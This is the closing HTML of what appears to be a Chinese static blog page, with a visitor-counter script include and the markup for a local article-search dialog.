+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
